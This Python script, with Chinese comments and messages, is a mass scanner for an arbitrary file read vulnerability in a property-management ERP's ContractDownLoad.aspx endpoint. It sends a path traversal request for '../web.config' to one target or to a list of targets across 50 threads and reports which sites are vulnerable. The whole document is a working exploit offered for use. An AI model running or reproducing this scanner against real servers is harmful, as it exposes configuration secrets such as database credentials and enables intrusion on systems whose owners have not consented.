import requests
import argparse
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description="物业ERP系统 ContractDownLoad.aspx 任意文件读取漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(50)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            args.url = f"http://{args.url}"
            check(args.url)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()


def check(target):
    url = f"{target}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q = 0.9,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }

    response = requests.post(url, headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200 and 'type' in response.text:
            print(f"[*] {target} 存在漏洞")
        else:
            print(f"[!] {target} 不存在漏洞")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


if __name__ == '__main__':
    main()